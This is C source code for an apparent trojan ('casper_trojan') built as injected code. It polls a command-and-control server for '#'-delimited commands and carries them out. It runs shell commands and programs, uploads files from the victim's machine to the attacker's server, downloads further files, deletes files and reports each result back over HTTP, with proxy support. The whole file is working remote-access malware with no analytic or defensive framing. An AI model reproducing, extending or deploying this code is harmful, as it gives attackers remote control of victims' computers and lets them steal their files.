#include "casper_trojan.h"


/////////////////////////////////////////////////
//         Trojan function for download        //
/////////////////////////////////////////////////

LPTSTR WINAPI TrojDownloader(INJECTEDDATA *pData, LPTSTR lpUrl, LPTSTR lpFilename, BOOL bSave)
{
	HINTERNET	hSession;
	HINTERNET	hService;
	HINTERNET	hRequest;
	HANDLE		hFile;
	HANDLE		hHeap;
	LPTSTR		pBuffer;
	TCHAR		lpProxyConf[25];
	BYTE		pBuffTmp[1024];
	DWORD		dwWritten;	
	DWORD		dwBytesRead;
	DWORD		dwSize = 0;
	INTERNET_BUFFERS InternetBufferIn = {0};
					

	// Win32 Internet functions init
	if (pData->bProxy) {		
		pData->fnsprintf(lpProxyConf, pData->lpFormatProxy, pData->lpIP, pData->uPort);

		hSession = pData->fnInternetOpen(pData->lpUserAgent, 
							INTERNET_OPEN_TYPE_PROXY, lpProxyConf, NULL, 0);		
	}
	else {
		hSession = pData->fnInternetOpen(pData->lpUserAgent, 
							INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);		
	}
	
	if (!hSession)
		return 0;


	// Open HTTP session
	hService = pData->fnInternetConnect(hSession, pData->lpSERVER, INTERNET_INVALID_PORT_NUMBER, 
								   NULL, NULL, 
								   INTERNET_SERVICE_HTTP, 
								   INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 
								   0);	

	if (!hService) {		
		pData->fnInternetCloseHandle(hSession); 

		return 0;
	}		

	// Open HTTP request
	hRequest = pData->fnHttpOpenRequest(hService, pData->lpTrojGET, lpUrl, NULL, 
							   NULL, NULL, 
							   INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE ,
							   0);

	if (!hRequest) {		
		pData->fnInternetCloseHandle(hSession); 

		return 0;
	}		
	
	// bProxyAuth	
	if (pData->bProxyAuth) {		
		if (!pData->fnHttpAddRequestHeaders(hRequest, pData->lpAuthorization, strlen(pData->lpAuthorization), 
								   HTTP_ADDREQ_FLAG_ADD_IF_NEW))
			return 0;
	}

	InternetBufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	InternetBufferIn.Next = NULL;				

	// Prepare to send data
	if (!pData->fnHttpSendRequestEx(hRequest, &InternetBufferIn, NULL, HSR_INITIATE, 0))		
		return 0;	

	if (!pData->fnHttpEndRequest(hRequest, NULL, HSR_INITIATE, 0))
		return 0;
	
	hHeap = pData->fnHeapCreate(0, sizeof(BYTE) * 1024, 0);

	pBuffer = (LPTSTR)(pData->fnHeapAlloc(hHeap, 0, sizeof(BYTE) * 1024));
	
	// Read data
	while (pData->fnInternetReadFile(hRequest, pBuffTmp, 1024, &dwBytesRead) ) {		
		if (dwBytesRead == 0)
			break;
		
		memcpy(pBuffer + dwSize, pBuffTmp, dwBytesRead);
		dwSize += dwBytesRead;
		pBuffer = (LPTSTR)(pData->fnHeapReAlloc(hHeap, 0, pBuffer, dwSize + 1024));		
	}	

	// Create file if necessary
	if (bSave) {		
		hFile = pData->fnCreateFile(lpFilename, GENERIC_WRITE,
							FILE_SHARE_READ,NULL,
							CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL,
							NULL);
		
		if (hFile == INVALID_HANDLE_VALUE) 
			return NULL;

		if ( !(pData->fnWriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL)) )
			return NULL; 

		pData->fnCloseHandle(hFile);		
	}		
	
	// Close Internet handle
	pData->fnInternetCloseHandle(hSession); 

	pBuffer[dwSize] = '\0';
		
	pData->fnInternetCloseHandle(hSession);
	pData->fnInternetCloseHandle(hService);
	pData->fnInternetCloseHandle(hRequest);


	return (pBuffer);
}


/////////////////////////////////////////////////
//          Trojan function for upload         //
/////////////////////////////////////////////////

int WINAPI TrojUploader(INJECTEDDATA *pData, LPTSTR lpServer, LPTSTR lpUrl, LPTSTR lpFilename)
{
	
	HINTERNET	hSession;
	HINTERNET	hService;
	HINTERNET	hRequest;
	HANDLE		hFile;
	PBYTE		pBuffer;
	BYTE		pBytes[1024];
	DWORD		dwNumOfBytesToRead = 0;
	DWORD		dwOutPostBufferLength = 0;
	DWORD		dwTotalBytes = 0;
	DWORD		dwSize = 0;
	DWORD		dwMimeHeaderLen = 0;
	DWORD		dwMimeTailLen = 0;
	TCHAR		szMimeHeader[255];
	TCHAR		szMimeTail[255];
	TCHAR		szContentLength[1024];	
	INTERNET_BUFFERS InternetBufferIn = {0};
			

	// Init MIME buffers
	pData->fnsprintf(szMimeHeader, pData->lpTrojMimeHeader, lpFilename);	
	pData->fnsprintf(szMimeTail, pData->lpTrojMimeTail);
	
	dwMimeHeaderLen	= strlen(szMimeHeader);
	dwMimeTailLen	= strlen(szMimeTail);	

	// Open file to upload
	hFile = pData->fnCreateFile(lpFilename, GENERIC_READ, 
						FILE_SHARE_READ, NULL, 
						OPEN_EXISTING, 
						FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, 
						NULL);

	if (hFile == INVALID_HANDLE_VALUE) 
		return 0;


	// Init buffer size
	dwSize = pData->fnGetFileSize(hFile, NULL) + dwMimeHeaderLen + dwMimeTailLen;
		
	// Memory allocation for send buffer
	pBuffer = (PBYTE)pData->fnHeapAlloc(pData->fnGetProcessHeap(), 0, dwSize);			

	// Copy MIME header to buffer
	memcpy(pBuffer,	szMimeHeader, dwMimeHeaderLen);
	

	// Read file
	while (pData->fnReadFile(hFile, pBytes, 1024, &dwNumOfBytesToRead, NULL) && dwNumOfBytesToRead > 0 && dwTotalBytes <= dwSize){
		memcpy((pBuffer + dwMimeHeaderLen + dwTotalBytes), pBytes, dwNumOfBytesToRead);				
		memset(pBytes, 0, 1024);
		dwTotalBytes += dwNumOfBytesToRead;				
	}		

	// Close file handle
	pData->fnCloseHandle(hFile);	

	// Copy MIME tail to buffer
	memcpy(pBuffer + dwMimeHeaderLen + dwTotalBytes, szMimeTail, dwMimeTailLen);
	

	// Win32 Internet functions init
	hSession = pData->fnInternetOpen(pData->lpUserAgent, 
							INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	
	if (!hSession)
		return 0;

	// Open HTTP session
	hService = pData->fnInternetConnect(hSession, lpServer, HTTP_PORT, 
							   NULL, NULL, 
							   INTERNET_SERVICE_HTTP, 
							   INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 
							   0);

	if (!hService) {		
		pData->fnInternetCloseHandle(hSession); 

		return 0;
	}

	// Open HTTP request
	hRequest = pData->fnHttpOpenRequest(hService, pData->lpTrojPOST, lpUrl, NULL, 
							   NULL, NULL, 
							   INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_FORMS_SUBMIT,
							   0);

	if (!hRequest) {		
		pData->fnInternetCloseHandle(hSession); 

		return 0;
	}
	
	// Add Content-Type field into HTTP header
	if (!pData->fnHttpAddRequestHeaders(hRequest, pData->lpTrojContentType, strlen(pData->lpTrojContentType), 
							   HTTP_ADDREQ_FLAG_ADD_IF_NEW))
		return 0;
	
	// Set buffer with 0
	memset(szContentLength, 0, 1024);

	pData->fnsprintf(szContentLength, pData->lpTrojContentLength, dwSize);

	// Add Content-Length field into HTTP header
	if (!pData->fnHttpAddRequestHeaders(hRequest, szContentLength, strlen(szContentLength), 
							   HTTP_ADDREQ_FLAG_ADD_IF_NEW))
		return 0;
	
	if (pData->bProxyAuth) {		
		if (!pData->fnHttpAddRequestHeaders(hRequest, pData->lpAuthorization, strlen(pData->lpAuthorization), 
								   HTTP_ADDREQ_FLAG_ADD_IF_NEW))
			return 0;
	}

	InternetBufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	InternetBufferIn.Next = NULL;	
	
	// Prepare to send data
	if (!pData->fnHttpSendRequestEx(hRequest, &InternetBufferIn, NULL, HSR_INITIATE, 0))		
		return 0;	

	if (!pData->fnInternetWriteFile(hRequest, pBuffer, dwSize, &dwOutPostBufferLength))
		return 0;

	if (!pData->fnHttpEndRequest(hRequest, NULL, HSR_INITIATE, 0))
		return 0;

	pData->fnInternetCloseHandle(hSession);
	pData->fnInternetCloseHandle(hService);
	pData->fnInternetCloseHandle(hRequest);

	return 1;
}


/////////////////////////////////////////////////
//      Trojan function for command exec       //
/////////////////////////////////////////////////

int WINAPI TrojExec(INJECTEDDATA *pData, LPTSTR lpCmd, LPTSTR lpFilename, BOOL bCmd) 
{
	PROCESS_INFORMATION pi;
	STARTUPINFO			si;
	TCHAR				szCmd[155];					
	
	
	// Init buffer
	if (bCmd) {
		pData->fnsprintf(szCmd, pData->lpTrojCmdFormat, lpCmd, lpFilename);
	}
	else {
		strcpy(szCmd, lpCmd);
	}			

	// Init
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    memset(&pi, 0, sizeof(pi));	

    // Start the child process. 
    if (!pData->fnCreateProcess( NULL, szCmd, NULL, NULL, TRUE,  0, NULL, NULL, &si, &pi )) 
		return 0;

	return 1;
}


/////////////////////////////////////////////////
//              Trojan main function           //
/////////////////////////////////////////////////

int WINAPI TrojMain(INJECTEDDATA *pData, LPTSTR lpCmd, LPTSTR lpParam1, LPTSTR lpParam2)
{
	TCHAR lpLogUrl[255];

			
	// EXECMD
	if(strcmp(lpCmd, pData->lpTrojCmdExecCMD) == 0) {		
		if (((injTrojExec)pData->fnTrojExec)(pData, lpParam1, lpParam2, TRUE)) {						
			// Delay before upload or CreateFile will fail (file not found)
			pData->fnSleep(2000); 			

			if (((injTrojUploader)pData->fnTrojUploader)(pData, pData->lpSERVER, pData->lpUP_URL, lpParam2)) {								
				pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatOK_A, pData->lpRES_URL, lpCmd, lpParam1, lpParam2);				
				((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);							
			}
			else {
				pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_A, pData->lpUP_URL, lpCmd, lpParam1, lpParam2);				
				((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
			}			

			pData->fnDeleteFile(lpParam2);
		}
		else {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_A, pData->lpUP_URL, lpCmd, lpParam1, lpParam2);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}				
	}

	// EXECPROG
	else if(strcmp(lpCmd, pData->lpTrojCmdExecProg) == 0) {
		if (((injTrojExec)pData->fnTrojExec)(pData, lpParam1, NULL, FALSE)) {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatOK_B, pData->lpRES_URL, lpCmd, lpParam1);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}
		else {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_B, pData->lpRES_URL, lpCmd, lpParam1);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}		
	}

	// UPLOAD
	else if(strcmp(lpCmd, pData->lpTrojCmdUpload) == 0) {		
		if (((injTrojUploader)pData->fnTrojUploader)(pData, pData->lpSERVER, lpParam1, lpParam2)) {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatOK_A, pData->lpRES_URL, lpCmd, lpParam1, lpParam2);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}
		else {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_A, pData->lpRES_URL, lpCmd, lpParam1, lpParam2);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}	
	}

	// DOWNLOAD
	else if(strcmp(lpCmd, pData->lpTrojCmdDownload) == 0) {			
		if (((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpParam1, lpParam2, TRUE) != NULL) {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatOK_A, pData->lpRES_URL, lpCmd, lpParam1, lpParam2);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}
		else {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_A, pData->lpRES_URL, lpCmd, lpParam1, lpParam2);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}				
	}

	// DELFILE
	else if(strcmp(lpCmd, pData->lpTrojCmdDelfile) == 0) {
		if (pData->fnDeleteFile(lpParam1)) {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatOK_B, RES_URL, lpCmd, lpParam1);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}
		else {
			pData->fnsprintf(lpLogUrl, pData->lpTrojLogFormatERROR_B, RES_URL, lpCmd, lpParam1);			
			((injTrojDownloader)(pData->fnTrojDownloader))(pData, lpLogUrl, NULL, FALSE);			
		}
	}

	return 1;
}


/////////////////////////////////////////////////
//      Trojan function to get commands        //
/////////////////////////////////////////////////

int WINAPI TrojGetCmd(INJECTEDDATA *pData)
{
	TCHAR	lpCmd[10];
	TCHAR	lpParam1[50];
	TCHAR	lpParam2[50];
	LPTSTR	lpBegin, lpEnd;
	LPTSTR	lpTemp;
	DWORD	len = 0;
	
	
	lpTemp = ((injTrojDownloader)(pData->fnTrojDownloader))(pData, pData->lpCMD_URL, NULL, FALSE);		

	//INFO
	pData->fnOutputDebugString(lpTemp);
	
	if (lpTemp) { 
			
		while(pData->fnStrChr(lpTemp, '#') != NULL) {											
			lpBegin = pData->fnStrChr(lpTemp, '#') + 1;
			lpTemp = lpBegin;															
			
			if (lpTemp - 1 == NULL ) {
				return 0;				
			}
			
			lpEnd = pData->fnStrChr(lpTemp, '#') + 1;		
			lpTemp = lpEnd;		

			if (lpTemp - 1 == NULL) {
				return 0;
			}			
				
			memcpy(lpCmd, lpBegin, strlen(lpBegin) - strlen(lpEnd) - 1);
			lpCmd[strlen(lpBegin) - strlen(lpEnd) - 1] = '\0';		


			lpBegin = pData->fnStrChr(lpTemp, '#') + 1;		
			lpTemp = lpBegin;		

			memcpy(lpParam1, lpEnd, strlen(lpEnd) - strlen(lpBegin) - 1);
			lpParam1[strlen(lpEnd) - strlen(lpBegin) - 1] = '\0';				

			if(pData->fnStrChr(lpTemp, '#') != NULL) {
				len = strlen(pData->fnStrChr(lpTemp, '#'));
			} 
			else {
				len = 0;
			}										

			memcpy(lpParam2, lpBegin, strlen(lpBegin) - len - 2);
			lpParam2[strlen(lpBegin) - len - 2] = '\0';				
					
			((injTrojMain)pData->fnTrojMain)(pData, lpCmd, lpParam1, lpParam2);			
		}
		
	}	// lpTemp != NULL		
		
	return 1;
}


